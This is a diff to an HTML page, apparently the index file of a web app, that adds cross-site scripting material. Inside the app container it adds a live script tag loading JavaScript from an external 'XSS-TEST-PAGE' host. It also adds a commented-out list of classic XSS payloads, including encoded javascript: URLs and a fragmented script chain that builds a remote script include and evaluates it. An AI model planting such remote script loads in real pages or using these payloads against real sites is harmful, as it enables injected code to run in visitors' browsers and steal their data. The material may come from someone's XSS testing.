@@ -14,12 +14,40 @@
         padding: 0;
       }
     </style>
-    <script>
+    <!-- xss跳转链接代码 -->
+    <!-- <script>
         alert(document.referrer);
-    </script>
+    </script> -->
   </head>
   <body>
-    <div id="app"></div>
+    <div id="app">
+      <SCRIPT SRC=https://parrotace.github.io/XSS-TEST-PAGE></SCRIPT>
+      <!-- <IMG SRC=http://3w.org/XSS/xss.js/>
+      <IMG SRC=javascript:alert('XSS')>
+      <IMG SRC=JaVaScRiPt:alert('XSS')>
+      <IMG SRC=javascript:alert("XSS")>
+      <IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+      <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+      <IMG SRC=jav..省略..S')>
+      <IMG SRC=jav..省略..S')>
+      <IMG SRC=&#x6A&#x61&#x76&#x61..省略..&#x58&#x53&#x53&#x27&#x29>
+      <IMG SRC="jav ascript:alert('XSS');">
+      <IMG SRC="jav ascript:alert('XSS');">
+      <IMG SRC="jav ascript:alert('XSS');">
+      <IMG SRC="jav ascript:alert('XSS');">
+      <IMG SRC="javascript:alert('XSS')">
+      <script>z='document.'</script>
+      <script>z=z+'write("'</script>
+      <script>z=z+'<script'</script>
+      <script>z=z+' src=ht'</script>
+      <script>z=z+'tp://ww'</script>
+      <script>z=z+'w.shell'</script>
+      <script>z=z+'.net/1.'</script>
+      <script>z=z+'js></sc'</script>
+      <script>z=z+'ript>")'</script>
+      <script>eval_r(z)</script> -->
+    </div>
     <!-- built files will be auto injected -->
   </body>
 </html>
+
